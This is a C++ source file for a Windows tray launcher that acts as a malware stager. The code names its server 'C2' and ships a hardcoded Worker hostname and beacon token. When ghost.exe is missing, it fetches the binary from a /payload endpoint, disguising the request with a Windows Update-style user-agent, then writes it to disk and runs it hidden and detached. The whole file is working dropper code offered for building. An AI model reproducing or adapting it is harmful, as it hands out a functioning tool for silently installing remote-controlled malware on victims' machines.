// launcher.cpp — Ghost system-tray launcher + stager
//
// If ghost.exe is missing, downloads it from the Cloudflare Worker
// /payload endpoint before launching.
//
// CONFIGURE BEFORE BUILDING:
//   Set LAUNCHER_C2_HOST to your Worker subdomain (no https://, no trailing slash)
//   Set LAUNCHER_BEACON_TOKEN to match BEACON_TOKEN on the server
//
// Compiles under x86_64-w64-mingw32-g++ (MinGW-w64) and MSVC.
// Links: user32, shell32, winhttp

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")

// ---------------------------------------------------------------------------
// *** CONFIGURE THESE BEFORE BUILDING ***
// ---------------------------------------------------------------------------

// Your Cloudflare Worker hostname — no https://, no trailing slash
// Example: L"ghost-c2.yourname.workers.dev"
static const wchar_t* LAUNCHER_C2_HOST    = L"ghost-c2.sujallamichhane.workers.dev";
static const wchar_t* LAUNCHER_BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

static constexpr UINT WM_TRAY_MSG  = WM_USER + 1;
static constexpr UINT ID_TRAY_ICON = 1;
static constexpr UINT ID_START     = 100;
static constexpr UINT ID_EXIT      = 101;
static constexpr INTERNET_PORT C2_PORT = 443;

static const wchar_t* GHOST_EXE    = L"ghost.exe";
static const wchar_t* WINDOW_CLASS = L"GhostLauncherWnd";
static const wchar_t* TRAY_TIP     = L"Ghost Launcher";

// ---------------------------------------------------------------------------
// Process check — TRUE if a process with the given name is running
// ---------------------------------------------------------------------------

static BOOL IsProcessRunning(const wchar_t* exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    BOOL found = FALSE;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return found;
}

// ---------------------------------------------------------------------------
// WinHTTP RAII handle wrapper — closes handles on scope exit
// ---------------------------------------------------------------------------

struct WinHttpHandles {
    HINTERNET session = nullptr;
    HINTERNET connect = nullptr;
    HINTERNET request = nullptr;
    ~WinHttpHandles() {
        if (request) WinHttpCloseHandle(request);
        if (connect) WinHttpCloseHandle(connect);
        if (session) WinHttpCloseHandle(session);
    }
    WinHttpHandles() = default;
    WinHttpHandles(const WinHttpHandles&) = delete;
    WinHttpHandles& operator=(const WinHttpHandles&) = delete;
};

// ---------------------------------------------------------------------------
// DownloadGhost — fetch /payload from Worker, write to ghostPath on disk
//
// Flow:
//   GET https://<LAUNCHER_C2_HOST>/payload
//   Header: X-Beacon-Token: <LAUNCHER_BEACON_TOKEN>
//   Response body: raw ghost.exe bytes
//   Write bytes → ghostPath file
//
// Returns TRUE on success, FALSE on any network or file error.
// ---------------------------------------------------------------------------

static BOOL DownloadGhost(const std::wstring& ghostPath) {
    WinHttpHandles h;

    // Open WinHTTP session — mimics Windows Update user-agent
    h.session = WinHttpOpen(
        L"Microsoft-WNS/10.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!h.session) return FALSE;

    // Connect to Worker host on 443
    h.connect = WinHttpConnect(h.session, LAUNCHER_C2_HOST, C2_PORT, 0);
    if (!h.connect) return FALSE;

    // Open GET request to /payload — WINHTTP_FLAG_SECURE = TLS
    h.request = WinHttpOpenRequest(
        h.connect,
        L"GET", L"/payload",
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!h.request) return FALSE;

    // Add auth header — Worker rejects requests without a valid beacon token
    std::wstring headers = std::wstring(L"X-Beacon-Token: ") + LAUNCHER_BEACON_TOKEN + L"\r\n";
    WinHttpAddRequestHeaders(
        h.request,
        headers.c_str(),
        static_cast<DWORD>(headers.size()),
        WINHTTP_ADDREQ_FLAG_ADD
    );

    // Send request (no body — GET)
    if (!WinHttpSendRequest(h.request,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) return FALSE;

    if (!WinHttpReceiveResponse(h.request, nullptr)) return FALSE;

    // Check HTTP status — anything other than 200 means token mismatch or
    // payload not yet uploaded to KV
    DWORD statusCode  = 0;
    DWORD statusSize  = sizeof(statusCode);
    WinHttpQueryHeaders(h.request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
    if (statusCode != 200) return FALSE;

    // Read response body into memory — ghost.exe is ~967K, well under 25MB KV cap
    std::vector<BYTE> payload;
    payload.reserve(1024 * 1024); // 1MB initial reservation

    DWORD available = 0;
    while (WinHttpQueryDataAvailable(h.request, &available) && available > 0) {
        std::vector<BYTE> buf(available);
        DWORD read = 0;
        if (WinHttpReadData(h.request, buf.data(), available, &read) && read > 0) {
            payload.insert(payload.end(), buf.begin(), buf.begin() + read);
        }
        // Hard cap at 32MB — sanity guard
        if (payload.size() > 32 * 1024 * 1024) return FALSE;
    }

    if (payload.empty()) return FALSE;

    // Write raw bytes to disk at ghostPath
    // FILE_FLAG_WRITE_THROUGH — flush immediately, no buffering delay
    HANDLE hFile = CreateFileW(
        ghostPath.c_str(),
        GENERIC_WRITE,
        0,          // no sharing while writing
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
        nullptr
    );
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD written = 0;
    BOOL ok = WriteFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &written, nullptr);
    CloseHandle(hFile);

    // Verify the write was complete — partial writes mean a corrupted binary
    return ok && (written == static_cast<DWORD>(payload.size()));
}

// ---------------------------------------------------------------------------
// LaunchGhost — download if missing, then spawn detached
// ---------------------------------------------------------------------------

static BOOL LaunchGhost() {
    if (IsProcessRunning(GHOST_EXE)) return TRUE; // already up

    // Resolve path: same directory as this executable
    wchar_t selfPath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    wchar_t* lastSlash = wcsrchr(selfPath, L'\\');
    if (!lastSlash) return FALSE;
    *(lastSlash + 1) = L'\0';

    std::wstring ghostPath = std::wstring(selfPath) + GHOST_EXE;

    // If ghost.exe is not on disk — download it from the Worker
    if (GetFileAttributesW(ghostPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        if (!DownloadGhost(ghostPath)) {
            // Download failed — nothing to launch
            return FALSE;
        }
        // Brief pause: let the filesystem flush before CreateProcessW reads it
        Sleep(250);
    }

    // Verify file is present after potential download
    if (GetFileAttributesW(ghostPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return FALSE;
    }

    STARTUPINFOW si    = {};
    si.cb              = sizeof(si);
    si.dwFlags         = STARTF_USESHOWWINDOW;
    si.wShowWindow     = SW_HIDE;

    PROCESS_INFORMATION pi = {};

    std::wstring cmdLine = L"\"" + ghostPath + L"\"";
    BOOL ok = CreateProcessW(
        nullptr,
        &cmdLine[0],
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        nullptr, nullptr,
        &si, &pi
    );

    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return ok;
}

// ---------------------------------------------------------------------------
// Tray icon management
// ---------------------------------------------------------------------------

static NOTIFYICONDATAW g_nid = {};

static void AddTrayIcon(HWND hwnd) {
    g_nid.cbSize           = sizeof(g_nid);
    g_nid.hWnd             = hwnd;
    g_nid.uID              = ID_TRAY_ICON;
    g_nid.uFlags           = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_nid.uCallbackMessage = WM_TRAY_MSG;
    g_nid.hIcon            = LoadIconW(nullptr, IDI_APPLICATION);
    wcsncpy_s(g_nid.szTip, TRAY_TIP, _TRUNCATE);
    Shell_NotifyIconW(NIM_ADD, &g_nid);
}

static void RemoveTrayIcon() {
    Shell_NotifyIconW(NIM_DELETE, &g_nid);
}

static void ShowTrayMenu(HWND hwnd) {
    POINT pt = {};
    GetCursorPos(&pt);

    HMENU menu   = CreatePopupMenu();
    BOOL running = IsProcessRunning(GHOST_EXE);

    AppendMenuW(menu, MF_STRING | (running ? MF_GRAYED : 0), ID_START,
                running ? L"Running" : L"Start ghost.exe");
    AppendMenuW(menu, MF_SEPARATOR, 0, nullptr);
    AppendMenuW(menu, MF_STRING, ID_EXIT, L"Exit Launcher");

    SetForegroundWindow(hwnd);
    TrackPopupMenu(menu, TPM_BOTTOMALIGN | TPM_LEFTALIGN,
                   pt.x, pt.y, 0, hwnd, nullptr);
    DestroyMenu(menu);
}

// ---------------------------------------------------------------------------
// Window procedure
// ---------------------------------------------------------------------------

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE:
            AddTrayIcon(hwnd);
            return 0;

        case WM_TRAY_MSG:
            if (lp == WM_RBUTTONUP || lp == WM_LBUTTONUP) {
                ShowTrayMenu(hwnd);
            }
            return 0;

        case WM_COMMAND:
            switch (LOWORD(wp)) {
                case ID_START: LaunchGhost(); return 0;
                case ID_EXIT:  DestroyWindow(hwnd); return 0;
            }
            break;

        case WM_DESTROY:
            RemoveTrayIcon();
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // Single-instance guard
    HANDLE mutex = CreateMutexW(nullptr, TRUE, L"GhostLauncherMutex_v1");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return 0;
    }

    WNDCLASSW wc     = {};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.lpszClassName = WINDOW_CLASS;
    RegisterClassW(&wc);

    // HWND_MESSAGE = message-only window: no taskbar entry, no visible surface
    HWND hwnd = CreateWindowExW(
        0, WINDOW_CLASS, L"",
        0, 0, 0, 0, 0,
        HWND_MESSAGE,
        nullptr, hInst, nullptr
    );
    if (!hwnd) { CloseHandle(mutex); return 1; }

    MSG msg = {};
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    CloseHandle(mutex);
    return static_cast<int>(msg.wParam);
}
